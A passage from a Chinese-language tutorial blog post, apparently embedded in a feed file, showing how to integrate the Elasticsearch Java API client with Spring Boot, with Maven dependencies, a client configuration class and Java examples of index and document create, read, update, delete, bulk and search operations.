punctuation">,</span>     <span class="token property">"post_tags"</span><span class="token operator">:</span> <span class="token string">"&lt;/b&gt;"</span><span class="token punctuation">,</span>    <span class="token property">"fields"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>查询结果：<img src="/img/24-6-2/31.png"></p><h2 id="SpringBoot集成ES"><a href="#SpringBoot集成ES" class="headerlink" title="SpringBoot集成ES"></a>SpringBoot集成ES</h2><p>官方文档：<a href="https://www.elastic.co/guide/en/elasticsearch/client/java-api-client/current/getting-started-java.html">https://www.elastic.co/guide/en/elasticsearch/client/java-api-client/current/getting-started-java.html</a></p><p><strong>依赖</strong></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>co.elastic.clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>elasticsearch-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>8.13.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><p>使用springboot</p><pre class="language-markup" data-language="markup"><code class="language-markup">\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-data-elasticsearch<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><p>注意版本要对应</p><p>这里我使用最新的用法<br>配置</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>eslearn<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">co<span class="token punctuation">.</span>elastic<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>elasticsearch<span class="token punctuation">.</span></span><span class="token class-name">ElasticsearchClient</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">co<span class="token punctuation">.</span>elastic<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>json<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span></span><span class="token class-name">JacksonJsonpMapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">co<span class="token punctuation">.</span>elastic<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>transport<span class="token punctuation">.</span></span><span class="token class-name">ElasticsearchTransport</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">co<span class="token punctuation">.</span>elastic<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>rest_client<span class="token punctuation">.</span></span><span class="token class-name">RestClientTransport</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpHost</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>elasticsearch<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">RestClient</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ElasticsearchConfig</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.data.es.url}"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token class-name">String</span> serverUrl<span class="token punctuation">;</span><span class="token annotation punctuation">@Bean</span><span class="token keyword">public</span> <span class="token class-name">ElasticsearchClient</span>  <span class="token function">restClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token class-name">RestClient</span> restClient <span class="token operator">=</span> <span class="token class-name">RestClient</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token class-name">HttpHost</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>serverUrl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ElasticsearchTransport</span> transport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RestClientTransport</span><span class="token punctuation">(</span>restClient<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">JacksonJsonpMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ElasticsearchClient</span> esClient <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ElasticsearchClient</span><span class="token punctuation">(</span>transport<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> esClient<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="索引-1"><a href="#索引-1" class="headerlink" title="索引"></a>索引</h3><p>创建索引</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span><span class="token keyword">private</span> <span class="token class-name">ElasticsearchClient</span> esClient<span class="token punctuation">;</span><span class="token annotation punctuation">@Test</span><span class="token keyword">void</span> <span class="token function">contextLoads</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">CreateIndexRequest</span> createIndexRequest<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CreateIndexRequest<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CreateIndexResponse</span> createIndexResponse <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">indices</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>createIndexRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>createIndexResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>判断索引是否存在</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">hasIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">ExistsRequest</span> indexRequest<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExistsRequest<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BooleanResponse</span> exists <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">indices</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>indexRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>exists<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>删除索引</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token class-name">DeleteIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">DeleteIndexRequest</span> indexRequest<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DeleteIndexRequest<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DeleteIndexResponse</span> delete <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">indices</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>indexRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>delete<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="文档-1"><a href="#文档-1" class="headerlink" title="文档"></a>文档</h3><p>实体类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>eslearn<span class="token punctuation">.</span>entity</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AllArgsConstructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span><span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>创建文档数据</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">addDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">User</span> yyjccc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"yyjccc"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">IndexRequest</span> indexRequest<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IndexRequest<span class="token punctuation">.</span>Builder</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">timeout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Time<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">"1s"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">document</span><span class="token punctuation">(</span>yyjccc<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//document()设置内容</span><span class="token comment">//index()设置索引名称</span><span class="token comment">//id ()设置插入数据的id</span><span class="token comment">//timeout()设置超时时间</span><span class="token class-name">IndexResponse</span> index <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span>indexRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//result 操作结果</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index<span class="token punctuation">.</span><span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>判断是否存在文档</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">hasDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">ExistsSourceRequest</span> sourceRequest<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ExistsSourceRequest<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BooleanResponse</span> booleanResponse <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">existsSource</span><span class="token punctuation">(</span>sourceRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>booleanResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>获取文档内容</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">getDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">GetRequest</span> getRequest<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetRequest<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">GetResponse</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> userGetResponse <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>getRequest<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>userGetResponse<span class="token punctuation">.</span><span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>注意实体类User必须是标准的JavaBean<br>跟新文档数据</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">updateDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"yyj"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">UpdateRequest</span> updateRequest<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateRequest<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">doc</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">UpdateResponse</span> update <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>updateRequest<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>update<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>删除文档</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">deleteDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">DeleteRequest</span> build <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DeleteRequest<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DeleteResponse</span> delete <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>build<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>delete<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>批量操作</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">bulkDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BulkOperation</span><span class="token punctuation">&gt;</span></span> operations<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> userList<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>userList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"uuu"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>userList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"yanyongju"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>userList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"youyou"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span>userList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">CreateOperation</span> createOperation <span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">CreateOperation<span class="token punctuation">.</span>Builder</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">CreateOperation<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">document</span><span class="token punctuation">(</span>userList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BulkOperation</span> build <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BulkOperation</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">BulkOperation<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>createOperation<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>operations<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>build<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">BulkRequest</span> bulkRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BulkRequest<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">operations</span><span class="token punctuation">(</span>operations<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BulkResponse</span> bulk <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">bulk</span><span class="token punctuation">(</span>bulkRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bulk<span class="token punctuation">.</span><span class="token function">errors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>查询</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">searchDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span><span class="token class-name">MatchQuery</span> matchQuery<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">MatchQuery<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">field</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">MatchAllQuery</span> matchAllQuery<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">MatchAllQuery<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">queryName</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">TermQuery</span> termQuery<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TermQuery<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">field</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Query</span> query<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Query<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span>matchAllQuery<span class="token punctuation">)</span><span class="token comment">//.term(termQuery)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">SearchRequest</span> searchRequest<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SearchRequest<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分页精准匹配</span><span class="token class-name">SearchResponse</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> search <span class="token operator">=</span> esClient<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>searchRequest<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></em>]]></content>
      
      
      
        <tags>
            
